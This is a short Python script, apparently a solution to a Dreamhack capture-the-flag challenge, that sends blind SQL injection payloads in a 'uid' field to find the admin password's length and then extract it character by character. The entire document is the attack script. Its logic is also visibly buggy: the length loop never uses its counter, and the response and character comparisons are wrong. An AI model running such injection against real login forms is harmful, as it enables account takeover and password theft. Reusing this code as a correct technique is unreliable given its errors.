import requests
url = "http://host3.dreamhack.games:8297/"
for i in range(7,100):
    res = requests.get(url,data={"uid":"1%27||uid=(concat(%27adm%27,%27in%27))%26%26length(upw)=44%23"})
    if 'admin' in res:
        print("글자 수")
        print(i)
        break

length = i
flag = ''
for i in range(length):
    for j in range(32,127):
        res=requests.get(url,data={"uid":f"1%27||uid=(concat(%27adm%27,%27in%27))%26%26substr(upw,{i},1)='{str(j)}'"})
        if res.text in 'admin':
            flag+=str(j)
            print(flag)

print(flag)